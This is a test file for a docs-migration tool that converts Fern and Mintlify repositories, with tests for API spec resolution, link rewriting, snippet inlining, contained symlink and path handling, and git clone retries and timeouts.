    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-spec-escapes-repo-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(join(fernRoot, 'apis', 'v2'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), JSON.stringify({ organization: 'acme' }))
    writeFileSync(join(fernRoot, 'docs.yml'), `
navigation:
  - page: Welcome
    path: welcome.mdx
  - api: API Reference
    api-name: v2
`)
    // fern/apis/v2/ -> four levels up escapes the repository checkout entirely.
    writeFileSync(join(fernRoot, 'apis', 'v2', 'generators.yml'), `
api:
  specs:
    - openapi: ../../../../outside-the-repo.yaml
`)
    writeFileSync(join(fernRoot, 'welcome.mdx'), '---\ntitle: Welcome\n---\n\nHello.')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/fern-docs' })

    expect(bundle.docsConfig.tabs.some((tab) => tab.api)).toBe(false)
    expect(bundle.warnings.some((warning) => /outside-the-repo\.yaml.*outside the repository/i.test(warning.message))).toBe(true)
  })

  it('warns that a Fern Definition API was not migrated when no OpenAPI document is configured', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-definition-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(join(fernRoot, 'definition'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), JSON.stringify({ organization: 'acme' }))
    writeFileSync(join(fernRoot, 'docs.yml'), `
navigation:
  - page: Welcome
    path: welcome.mdx
  - api: API Reference
`)
    writeFileSync(join(fernRoot, 'definition', 'api.yml'), 'types: {}\n')
    writeFileSync(join(fernRoot, 'welcome.mdx'), '---\ntitle: Welcome\n---\n\nHello.')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/fern-docs' })

    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      code: 'unsupported-config',
      message: expect.stringContaining('Fern Definition'),
    }))
    expect(bundle.docsConfig.tabs.some((tab) => tab.api)).toBe(false)
  })

  it("resolves a multi-API repo's spec by `api-name` (the fern/apis/<name> folder), not the `api:` display title", () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-api-name-'))
    const fernRoot = join(root, 'fern')
    // `api: Plant API` is only a display title; the folder Fern actually
    // looks up is named by the sibling `api-name: plants`. A layout with
    // two APIs (`apis/plants`, `apis/animals`) reproduces the case where
    // looking up `apis/Plant API` finds nothing and the tab silently drops.
    mkdirSync(join(fernRoot, 'apis', 'plants', 'openapi'), { recursive: true })
    mkdirSync(join(fernRoot, 'apis', 'animals'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), JSON.stringify({ organization: 'acme' }))
    writeFileSync(join(fernRoot, 'docs.yml'), `
navigation:
  - page: Welcome
    path: welcome.mdx
  - api: Plant API
    api-name: plants
`)
    writeFileSync(join(fernRoot, 'apis', 'plants', 'generators.yml'), `
api:
  specs:
    - openapi: openapi/plants.yml
`)
    writeFileSync(join(fernRoot, 'apis', 'plants', 'openapi', 'plants.yml'), 'openapi: 3.0.0\ninfo:\n  title: Plant API\n  version: "1.0"\npaths: {}\n')
    writeFileSync(join(fernRoot, 'welcome.mdx'), '---\ntitle: Welcome\n---\n\nHello.')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/fern-docs' })

    const apiTab = bundle.docsConfig.tabs.find((tab) => tab.api)
    expect(apiTab?.api?.source).toBe('openapi/plants.yml')
    expect(bundle.assets.map((asset) => asset.path)).toContain('openapi/plants.yml')
    expect(bundle.warnings.some((warning) => warning.message.includes('No OpenAPI'))).toBe(false)
  })

  it('warns naming the API node when no spec can be resolved for it, instead of silently dropping the tab', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-api-unresolved-'))
    const fernRoot = join(root, 'fern')
    // `apis/plants` has no generators.yml/spec at all, so nothing resolves
    // and there is no Fern Definition either.
    mkdirSync(join(fernRoot, 'apis', 'plants'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), JSON.stringify({ organization: 'acme' }))
    writeFileSync(join(fernRoot, 'docs.yml'), `
navigation:
  - page: Welcome
    path: welcome.mdx
  - api: Plant API
    api-name: plants
`)
    writeFileSync(join(fernRoot, 'welcome.mdx'), '---\ntitle: Welcome\n---\n\nHello.')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/fern-docs' })

    expect(bundle.docsConfig.tabs.some((tab) => tab.api)).toBe(false)
    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      code: 'unsupported-config',
      message: expect.stringContaining('plants'),
    }))
  })

  it('never attaches a sibling API\'s spec found by a repo-wide scan when the requested api-name has none of its own', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-api-sibling-scan-'))
    const fernRoot = join(root, 'fern')
    // `apis/plants` exists but has no generators.yml of its own; a sibling
    // `apis/animals` does, with a real openapi.yml. A repo-wide scan for
    // "any openapi.yml" would find and silently attach the Animal spec to
    // the Plant tab.
    mkdirSync(join(fernRoot, 'apis', 'plants'), { recursive: true })
    mkdirSync(join(fernRoot, 'apis', 'animals', 'openapi'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), JSON.stringify({ organization: 'acme' }))
    writeFileSync(join(fernRoot, 'docs.yml'), `
navigation:
  - page: Welcome
    path: welcome.mdx
  - api: Plant API
    api-name: plants
`)
    writeFileSync(join(fernRoot, 'apis', 'animals', 'generators.yml'), `
api:
  specs:
    - openapi: openapi/openapi.yml
`)
    writeFileSync(join(fernRoot, 'apis', 'animals', 'openapi', 'openapi.yml'), 'openapi: 3.0.0\ninfo:\n  title: Animal API\n  version: "1.0"\npaths: {}\n')
    writeFileSync(join(fernRoot, 'welcome.mdx'), '---\ntitle: Welcome\n---\n\nHello.')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/fern-docs' })

    expect(bundle.docsConfig.tabs.some((tab) => tab.api)).toBe(false)
    expect(bundle.assets.map((asset) => asset.path)).not.toContain('openapi/openapi.yml')
    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      code: 'unsupported-config',
      message: expect.stringContaining('plants'),
    }))
  })

  it('never attaches another API\'s spec via a root generators.yml in a multi-API repo when this api node has an api-name', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-api-root-mismatch-'))
    const fernRoot = join(root, 'fern')
    // A multi-API layout (`fern/apis/` exists) with no `apis/plants` folder.
    // The Fern project root's own generators.yml configures a spec meant for
    // a different API; trusting it here would silently bind the wrong spec.
    mkdirSync(join(fernRoot, 'apis', 'animals'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), JSON.stringify({ organization: 'acme' }))
    writeFileSync(join(fernRoot, 'docs.yml'), `
navigation:
  - page: Welcome
    path: welcome.mdx
  - api: Plant API
    api-name: plants
`)
    writeFileSync(join(fernRoot, 'generators.yml'), `
api:
  specs:
    - openapi: animals.yml
`)
    writeFileSync(join(fernRoot, 'animals.yml'), 'openapi: 3.0.0\ninfo:\n  title: Animal API\n  version: "1.0"\npaths: {}\n')
    writeFileSync(join(fernRoot, 'welcome.mdx'), '---\ntitle: Welcome\n---\n\nHello.')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/fern-docs' })

    expect(bundle.docsConfig.tabs.some((tab) => tab.api)).toBe(false)
    expect(bundle.assets.map((asset) => asset.path)).not.toContain('animals.yml')
    const warning = bundle.warnings.find((entry) => entry.message.startsWith('No OpenAPI'))
    // Names only what was actually checked: the api-name folder, not the root.
    expect(warning?.message).toContain('fern/apis/plants/generators.yml')
    expect(warning?.message).not.toContain('fern/generators.yml')
    expect(warning?.message).not.toContain('any openapi')
  })

  it('keeps the tab of a single-API repo (no fern/apis/) whose api node sets api-name, via the root generators.yml', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-fern-api-name-single-'))
    const fernRoot = join(root, 'fern')
    mkdirSync(join(fernRoot, 'openapi'), { recursive: true })
    writeFileSync(join(fernRoot, 'fern.config.json'), JSON.stringify({ organization: 'acme' }))
    writeFileSync(join(fernRoot, 'docs.yml'), `
navigation:
  - page: Welcome
    path: welcome.mdx
  - api: Plant API
    api-name: plants
`)
    writeFileSync(join(fernRoot, 'generators.yml'), 'api:\n  specs:\n    - openapi: openapi/plants.yml\n')
    writeFileSync(join(fernRoot, 'openapi', 'plants.yml'), 'openapi: 3.0.0\ninfo:\n  title: Plant API\n  version: "1.0"\npaths: {}\n')
    writeFileSync(join(fernRoot, 'welcome.mdx'), '---\ntitle: Welcome\n---\n\nHello.')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/fern-docs' })

    expect(bundle.docsConfig.tabs.find((tab) => tab.api)?.api?.source).toBe('openapi/plants.yml')
    expect(bundle.warnings.some((warning) => warning.message.startsWith('No OpenAPI'))).toBe(false)
  })
})

describe('Mintlify mounted links', () => {
  it('retains state and handlers from an imported interactive MDX snippet', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-mintlify-stateful-snippet-'))
    mkdirSync(join(root, 'snippets'), { recursive: true })
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json', navigation: { pages: ['index'] },
    }))
    writeFileSync(join(root, 'index.mdx'), [
      '---', 'title: Demo', '---', '',
      'import { Counter } from "/snippets/counter.mdx";', '', '<Counter />',
    ].join('\n'))
    writeFileSync(join(root, 'snippets', 'counter.mdx'), [
      'export const Counter = () => {',
      '  const [count, setCount] = useState(0)',
      '  const label = `Count ${count}`',
      '  return <button onClick={() => setCount(count + 1)}>{label}</button>',
      '}',
    ].join('\n'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const page = bundle.pages.find((candidate) => candidate.id === 'introduction')
    expect(page?.body).toMatch(/<Migrated[a-f0-9]+\s*\/>/)
    expect(page?.body).not.toContain('count + 1')
    const clientSource = bundle.componentFiles?.map((file) => String(file.content)).find((content) => content.includes('setCount(count + 1)'))
    expect(clientSource).toContain("'use client';")
    expect(clientSource).toContain('const [count, setCount] = useState(0)')
  })

  it('keeps translated JSX code example imports inside their indented fence', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-mintlify-translated-code-'))
    mkdirSync(join(root, 'fr'), { recursive: true })
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { languages: [
        { language: 'en', default: true, pages: ['index'] },
        { language: 'fr', pages: ['fr/example'] },
      ] },
    }))
    writeFileSync(join(root, 'index.mdx'), '---\ntitle: Home\n---\n\nHome.')
    writeFileSync(join(root, 'fr', 'example.mdx'), [
      '---', 'title: Exemple', '---', '',
      '<Steps>', '  <Step title="Utiliser le hook">',
      '    ```tsx',
      '    import { useState } from "react";',
      '    import { useChat } from "@ai-sdk/react";',
      '    function Example() { return useState(0) }',
      '    ```', '  </Step>', '</Steps>',
    ].join('\n'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const body = bundle.pages.find((page) => page.id === 'fr/example')?.body ?? ''
    expect(body).toContain('```tsx\nimport { useState } from "react";\nimport { useChat } from "@ai-sdk/react";')
    expect(body.trimStart()).not.toMatch(/^import \{ useState \}/)
    expect(bundle.warnings.some((warning) => warning.message.includes("npm package '@ai-sdk/react'"))).toBe(false)
  })

  it('retains translated list examples wrapped in indented JSX', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-mintlify-translated-list-'))
    mkdirSync(join(root, 'fr'), { recursive: true })
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { languages: [
        { language: 'en', default: true, pages: ['index'] },
        { language: 'fr', pages: ['fr/reusable-snippets'] },
      ] },
    }))
    writeFileSync(join(root, 'index.mdx'), '---\ntitle: Home\n---\n\nHome.')
    writeFileSync(join(root, 'fr', 'reusable-snippets.mdx'), [
      '---', 'title: Extraits réutilisables', '---', '',
      '1. Ajoutez votre extrait.', '',
      '   <CodeGroup>', '',
      '     ```mdx Import absolu',
      '     import MySnippet from "/shared/my-snippet.mdx";',
      '     <MySnippet />',
      '     ```', '',
      '   </CodeGroup>',
    ].join('\n'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const page = bundle.pages.find((candidate) => candidate.id === 'fr/reusable-snippets')
    expect(page).toBeDefined()
    expect(page?.body).toContain('```mdx Import absolu')
    expect(page?.body).toContain('import MySnippet from "/shared/my-snippet.mdx";')
    expect(bundle.warnings.some((warning) => warning.source === 'fr/reusable-snippets.mdx' && warning.message.includes('Imported snippet'))).toBe(false)
    expect(bundle.warnings.some((warning) => warning.code === 'skipped-file' && warning.source === 'fr/reusable-snippets.mdx')).toBe(false)
  })

  it('rewrites only links to imported localized pages', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-mintlify-mounted-links-'))
    mkdirSync(join(root, 'fr'), { recursive: true })
    mkdirSync(join(root, 'fr', 'editor'), { recursive: true })
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { languages: [
        { language: 'en', default: true, pages: ['introduction', 'quickstart'] },
        { language: 'fr', pages: ['fr/introduction', 'fr/quickstart', 'fr/editor/index'] },
      ] },
    }))
    writeFileSync(join(root, 'introduction.mdx'), '---\ntitle: Welcome\n---\n\nHello.')
    writeFileSync(join(root, 'quickstart.mdx'), '---\ntitle: Quickstart\n---\n\nHello.')
    writeFileSync(join(root, 'fr', 'quickstart.mdx'), '---\ntitle: Démarrage\n---\n\nHello.')
    writeFileSync(join(root, 'fr', 'editor', 'index.mdx'), '---\ntitle: Éditeur\n---\n\nEditor.')
    writeFileSync(join(root, 'fr', 'introduction.mdx'), [
      '---', 'title: Bienvenue', '---', '',
      '[Start](/docs/fr/quickstart?view=all#install)',
      '<Card title="Start" href="/docs/fr/quickstart#install" />',
      '<Card title="Editor" href="/docs/fr/editor/index" />',
      '[Already local](/fr/quickstart)',
      '[Missing](/docs/fr/missing)',
      '[Asset](/docs/fr/image.png)',
      '[External](https://example.com/docs/fr/quickstart)',
      '`/docs/fr/quickstart`',
      '```md', '[Example](/docs/fr/quickstart)', '```',
    ].join('\n'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const body = bundle.pages.find((page) => page.id === 'fr/introduction')?.body ?? ''
    expect(body).toContain('[Start](/fr/quickstart?view=all#install)')
    expect(body).toContain('href="/fr/quickstart#install"')
    expect(body).toContain('href="/fr/editor/index"')
    expect(bundle.docsConfig.redirects).toContainEqual(expect.objectContaining({ source: '/fr/editor/index', destination: '/fr/editor' }))
    expect(body).toContain('[Already local](/fr/quickstart)')
    expect(body).toContain('[Missing](/docs/fr/missing)')
    expect(body).toContain('[Asset](/docs/fr/image.png)')
    expect(body).toContain('https://example.com/docs/fr/quickstart')
    expect(body).toContain('`/docs/fr/quickstart`')
    expect(body).toContain('[Example](/docs/fr/quickstart)')
  })

})

describe('scanFiles follows a submodule symlink inside the repository checkout', () => {
  it('imports pages from a symlinked directory that resolves inside repositoryDir (submodule content)', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-submodule-symlink-'))
    // Mirrors Oasis's layout: docs/core is a symlink into a sibling
    // external/ submodule checkout, outside the docs root but still inside
    // the repository.
    mkdirSync(join(root, 'docs'), { recursive: true })
    mkdirSync(join(root, 'external', 'oasis-core', 'docs'), { recursive: true })
    writeFileSync(join(root, 'docs', 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['introduction', 'core/overview'] },
    }))
    writeFileSync(join(root, 'docs', 'introduction.mdx'), '---\ntitle: Welcome\n---\n\nHello.')
    writeFileSync(join(root, 'external', 'oasis-core', 'docs', 'overview.mdx'), '---\ntitle: Core overview\n---\n\nSubmodule content.')
    symlinkSync(join(root, 'external', 'oasis-core', 'docs'), join(root, 'docs', 'core'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs', docsDir: 'docs' })

    expect(bundle.pages.map((page) => page.id)).toContain('core/overview')
    expect(bundle.pages.find((page) => page.id === 'core/overview')?.body).toContain('Submodule content.')
  })

  it('never follows a symlink that resolves outside the repository checkout', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-symlink-escape-'))
    const outside = mkdtempSync(join(tmpdir(), 'thally-migrate-symlink-escape-outside-'))
    mkdirSync(join(root, 'docs'), { recursive: true })
    writeFileSync(join(outside, 'secret.mdx'), '---\ntitle: Secret\n---\n\nShould never be imported.')
    writeFileSync(join(root, 'docs', 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['introduction'] },
    }))
    writeFileSync(join(root, 'docs', 'introduction.mdx'), '---\ntitle: Welcome\n---\n\nHello.')
    symlinkSync(outside, join(root, 'docs', 'escaped'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs', docsDir: 'docs' })

    expect(bundle.pages.map((page) => page.id)).not.toContain('escaped/secret')
    expect(bundle.pages.map((page) => page.title)).not.toContain('Secret')
  })

  it('does not hang on a symlink cycle', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-symlink-cycle-'))
    mkdirSync(join(root, 'docs', 'a'), { recursive: true })
    writeFileSync(join(root, 'docs', 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['introduction'] },
    }))
    writeFileSync(join(root, 'docs', 'introduction.mdx'), '---\ntitle: Welcome\n---\n\nHello.')
    // docs/a/loop -> docs/a (a self-referencing cycle one level down).
    symlinkSync(join(root, 'docs', 'a'), join(root, 'docs', 'a', 'loop'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs', docsDir: 'docs' })

    expect(bundle.pages.map((page) => page.id)).toContain('introduction')
  })
})

describe('scanFiles walks a build/dist/coverage-named directory inside the docs content root', () => {
  it('imports pages from a real "build" subdirectory of the docs root (oasisprotocol/docs repro)', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-content-build-dir-'))
    mkdirSync(join(root, 'docs', 'build', 'tools'), { recursive: true })
    writeFileSync(join(root, 'docs', 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['introduction', 'build/tools/llms'] },
    }))
    writeFileSync(join(root, 'docs', 'introduction.mdx'), '---\ntitle: Welcome\n---\n\nHello.')
    writeFileSync(join(root, 'docs', 'build', 'tools', 'llms.mdx'), '---\ntitle: LLM tools\n---\n\nReal content that used to be silently dropped.')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/oasisprotocol/docs', docsDir: 'docs' })

    expect(bundle.pages.map((page) => page.id)).toContain('build/tools/llms')
    expect(bundle.pages.find((page) => page.id === 'build/tools/llms')?.body).toContain('used to be silently dropped')
    expect(bundle.warnings.some((warning) => warning.message.includes('was skipped during migration'))).toBe(false)
  })

  it('still skips node_modules inside the docs root, but warns if it holds Markdown', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-content-node-modules-'))
    mkdirSync(join(root, 'docs', 'node_modules', 'some-pkg'), { recursive: true })
    writeFileSync(join(root, 'docs', 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['introduction'] },
    }))
    writeFileSync(join(root, 'docs', 'introduction.mdx'), '---\ntitle: Welcome\n---\n\nHello.')
    writeFileSync(join(root, 'docs', 'node_modules', 'some-pkg', 'readme.md'), '# Not a real page')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs', docsDir: 'docs' })

    expect(bundle.pages.map((page) => page.id)).not.toContain('node_modules/some-pkg/readme')
    expect(bundle.warnings.some((warning) => warning.code === 'unsupported-config'
      && warning.message.includes('node_modules')
      && warning.message.includes('was skipped during migration'))).toBe(true)
  })
})

describe('gitmodulePaths', () => {
  it('reads every submodule path from .gitmodules, in file order', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-gitmodules-'))
    writeFileSync(join(root, '.gitmodules'), [
      '[submodule "docs/core"]',
      '\tpath = docs/core',
      '\turl = https://github.com/acme/core.git',
      '[submodule "docs/adrs"]',
      '\tpath = docs/adrs',
      '\turl = https://github.com/acme/adrs.git',
    ].join('\n'))

    expect(gitmodulePaths(root)).toEqual(['docs/core', 'docs/adrs'])
  })

  it('returns an empty list when there is no .gitmodules', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-gitmodules-none-'))
    expect(gitmodulePaths(root)).toEqual([])
  })
})

describe('cloneGitHubRepository retry', () => {
  afterEach(() => {
    cloneOutcomes.queue.length = 0
    gitSpawnCalls.envs.length = 0
    gitSpawnCalls.args.length = 0
    gitKills.count = 0
    delete process.env.THALLY_MIGRATE_CLONE_TIMEOUT_MS
    vi.useRealTimers()
  })

  const acme = { owner: 'acme', repo: 'docs', branch: 'main', docsDir: '', cloneUrl: 'https://github.com/acme/docs.git' }

  it('asks git for progress output so a healthy transfer is distinguishable from a stall', async () => {
    await cloneGitHubRepository(acme, mkdtempSync(join(tmpdir(), 'thally-clone-args-')))
    expect(gitSpawnCalls.args[0]).toEqual(expect.arrayContaining(['clone', '--progress', '--depth', '1', '--single-branch']))
  })

  it('kills a silent clone after the idle timeout, retries it, and then reports an actionable error', async () => {
    vi.useFakeTimers()
    process.env.THALLY_MIGRATE_CLONE_TIMEOUT_MS = '3000'
    cloneOutcomes.queue.push({ code: 0, hang: true }, { code: 0, hang: true }, { code: 0, hang: true })
    const result = expect(cloneGitHubRepository(acme, mkdtempSync(join(tmpdir(), 'thally-clone-stall-'))))
      .rejects.toThrow(/timed out \(no progress for 3s\).*THALLY_MIGRATE_CLONE_TIMEOUT_MS/)
    await vi.advanceTimersByTimeAsync(60_000)
    await result
    expect(gitKills.count).toBe(3)
  })

  it('reports a sub-second idle timeout in milliseconds rather than as 0s', async () => {
    vi.useFakeTimers()
    process.env.THALLY_MIGRATE_CLONE_TIMEOUT_MS = '400'
    cloneOutcomes.queue.push({ code: 0, hang: true }, { code: 0, hang: true }, { code: 0, hang: true })
    const result = expect(cloneGitHubRepository(acme, mkdtempSync(join(tmpdir(), 'thally-clone-subsecond-'))))
      .rejects.toThrow(/timed out \(no progress for 400ms\)/)
    await vi.advanceTimersByTimeAsync(60_000)
    await result
  })

  it('settles a killed clone even when a helper keeps the stderr pipe open (no close event)', async () => {
    vi.useFakeTimers()
    process.env.THALLY_MIGRATE_CLONE_TIMEOUT_MS = '3000'
    cloneOutcomes.queue.push({ code: 0, hang: true, exitOnly: true }, { code: 0, hang: true, exitOnly: true }, { code: 0, hang: true, exitOnly: true })
    const result = expect(cloneGitHubRepository(acme, mkdtempSync(join(tmpdir(), 'thally-clone-noclose-'))))
      .rejects.toThrow(/timed out \(no progress for 3s\)/)
    await vi.advanceTimersByTimeAsync(60_000)
    await result
  })

  it('finishes when git exits before the idle timeout while a helper keeps stderr open', async () => {
    vi.useFakeTimers()
    // The idle timeout (500 ms) is shorter than the exit drain, so before the
    // fix it fired after git had exited and tried to kill a dead process.
    process.env.THALLY_MIGRATE_CLONE_TIMEOUT_MS = '500'
    cloneOutcomes.queue.push({ code: 0, exitAt: 100, helperTicks: [300, 900, 1500] })
    let settled = false
    const result = cloneGitHubRepository(acme, mkdtempSync(join(tmpdir(), 'thally-clone-exit-first-'))).finally(() => { settled = true })
    await vi.advanceTimersByTimeAsync(2_200)
    expect(settled).toBe(true)
    await expect(result).resolves.toBeUndefined()
    expect(gitKills.count).toBe(0)
  })

  it('reports git\'s own error when it exits non-zero before the timeout and the pipe never closes', async () => {
    vi.useFakeTimers()
    process.env.THALLY_MIGRATE_CLONE_TIMEOUT_MS = '500'
    cloneOutcomes.queue.push({ code: 128, stderr: 'fatal: repository not found\n', exitAt: 100, helperTicks: [700] })
    const result = cloneGitHubRepository(acme, mkdtempSync(join(tmpdir(), 'thally-clone-exit-fail-')))
    const settledError = result.then(() => null, (error: Error) => error)
    await vi.advanceTimersByTimeAsync(2_200)
    const error = await settledError
    expect(error?.message).toMatch(/^Failed to clone acme\/docs: fatal: repository not found/)
    expect(error?.message).not.toMatch(/timed out/)
    expect(gitKills.count).toBe(0)
  })

  it('settles once when git exits and the pipe closes shortly after', async () => {
    vi.useFakeTimers()
    process.env.THALLY_MIGRATE_CLONE_TIMEOUT_MS = '3000'
    cloneOutcomes.queue.push({ code: 0, exitAt: 100, closeAt: 150 })
    const result = cloneGitHubRepository(acme, mkdtempSync(join(tmpdir(), 'thally-clone-exit-close-')))
    await vi.advanceTimersByTimeAsync(200)
    await expect(result).resolves.toBeUndefined()
    await vi.advanceTimersByTimeAsync(5_000)
    expect(gitKills.count).toBe(0)
    expect(gitSpawnCalls.args).toHaveLength(1)
  })

  it('does not kill a slow clone that keeps printing progress past the idle timeout', async () => {
    vi.useFakeTimers()
    process.env.THALLY_MIGRATE_CLONE_TIMEOUT_MS = '3000'
    cloneOutcomes.queue.push({ code: 0, ticks: [2000, 4000, 6000, 8000] })
    const result = cloneGitHubRepository(acme, mkdtempSync(join(tmpdir(), 'thally-clone-slow-')))
    await vi.advanceTimersByTimeAsync(20_000)
    await expect(result).resolves.toBeUndefined()
    expect(gitKills.count).toBe(0)
  })

  it('reports the real git error, not the progress lines that preceded it', async () => {
    cloneOutcomes.queue.push({ code: 128, stderr: 'Receiving objects:  42% (10/24)\rReceiving objects: 100% (24/24)\rfatal: Remote branch nope not found in upstream origin\n' })
    await expect(cloneGitHubRepository(acme, mkdtempSync(join(tmpdir(), 'thally-clone-tail-'))))
      .rejects.toThrow(/^Failed to clone acme\/docs: fatal: Remote branch nope not found in upstream origin$/)
  })

  it("neutralizes the Git LFS filter driver per-process (never the global git config) on the clone", async () => {
    const targetDir = mkdtempSync(join(tmpdir(), 'thally-clone-lfs-env-'))
    cloneOutcomes.queue.push({ code: 0 })
    await cloneGitHubRepository(
      { owner: 'acme', repo: 'docs', branch: 'main', docsDir: '', cloneUrl: 'https://github.com/acme/docs.git' },
      targetDir,
    )
    expect(gitSpawnCalls.envs).toHaveLength(1)
    const env = gitSpawnCalls.envs[0]
    // GIT_CONFIG_* env pairs take precedence over the user's own global git
    // config for this one process, overriding filter.lfs.smudge/clean
    // (real content was never fetched anyway) and filter.lfs.process
    // (which would otherwise still win over smudge/clean), so a repo whose
    // LFS binary is missing on this host clones instead of hard-failing.
    expect(env.GIT_CONFIG_COUNT).toBe('4')
    const pairs = Object.entries(env).filter(([key]) => /^GIT_CONFIG_KEY_\d+$/.test(key))
      .map(([key, value]) => [value, env[key.replace('KEY', 'VALUE')]])
    expect(pairs).toContainEqual(['filter.lfs.smudge', 'cat'])
    expect(pairs).toContainEqual(['filter.lfs.clean', 'cat'])
    expect(pairs).toContainEqual(['filter.lfs.required', 'false'])
  })

  it('retries a transient network-class clone failure and succeeds', async () => {
    const targetDir = mkdtempSync(join(tmpdir(), 'thally-clone-retry-'))
    cloneOutcomes.queue.push(
      { code: 128, stderr: 'error: RPC failed; curl 56 Recv failure: Connection reset by peer' },
      { code: 0 },
    )
    await expect(cloneGitHubRepository(
      { owner: 'acme', repo: 'docs', branch: 'main', docsDir: '', cloneUrl: 'https://github.com/acme/docs.git' },
      targetDir,
    )).resolves.toBeUndefined()
    expect(cloneOutcomes.queue).toHaveLength(0)
  })

  it('does not retry a non-network clone failure', async () => {
    const targetDir = mkdtempSync(join(tmpdir(), 'thally-clone-retry-'))
    cloneOutcomes.queue.push({ code: 128, stderr: "fatal: repository 'https://github.com/acme/missing.git/' not found" })
    await expect(cloneGitHubRepository(
      { owner: 'acme', repo: 'missing', branch: 'main', docsDir: '', cloneUrl: 'https://github.com/acme/missing.git' },
      targetDir,
    )).rejects.toThrow(/not found/)
    // Only the one scripted attempt was consumed; a second would have been
    // queued only if the (non-retryable) failure had triggered a retry.
    expect(cloneOutcomes.queue).toHaveLength(0)
  })

  it('gives up after exhausting all retry attempts on a repeated network-class failure', async () => {
    const targetDir = mkdtempSync(join(tmpdir(), 'thally-clone-retry-'))
    cloneOutcomes.queue.push(
      { code: 128, stderr: 'error: RPC failed; curl 56 Recv failure: Connection reset by peer' },
      { code: 128, stderr: 'error: RPC failed; curl 56 Recv failure: Connection reset by peer' },
      { code: 128, stderr: 'error: RPC failed; curl 56 Recv failure: Connection reset by peer' },
    )
    await expect(cloneGitHubRepository(
      { owner: 'acme', repo: 'docs', branch: 'main', docsDir: '', cloneUrl: 'https://github.com/acme/docs.git' },
      targetDir,
    )).rejects.toThrow(/RPC failed/)
    expect(cloneOutcomes.queue).toHaveLength(0)
  })
})

describe('Mintlify snippet inlining hardening', () => {
  function snippetFixture(files: Record<string, string>, body: string, home = 'home') {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-snippet-hardening-'))
    writeFileSync(join(root, 'docs.json'), JSON.stringify({ $schema: 'https://mintlify.com/docs.json', navigation: { pages: [home] } }))
    for (const [path, content] of Object.entries(files)) {
      mkdirSync(dirname(join(root, path)), { recursive: true })
      writeFileSync(join(root, path), content)
    }
    writeFileSync(join(root, `${home}.mdx`), `---\ntitle: Home\n---\n\n${body}\n`)
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    return { root, page: bundle.pages.find((candidate) => candidate.id === home), warnings: bundle.warnings }
  }

  it('recognises a $-prefixed export and lists, and does not slow down on adversarial export lists', () => {
    const { page, warnings } = snippetFixture({
      'snippets/c.mdx': "import q from 'q';\nexport const $x = q.z;\nconst b = 1;\nexport { b };\n",
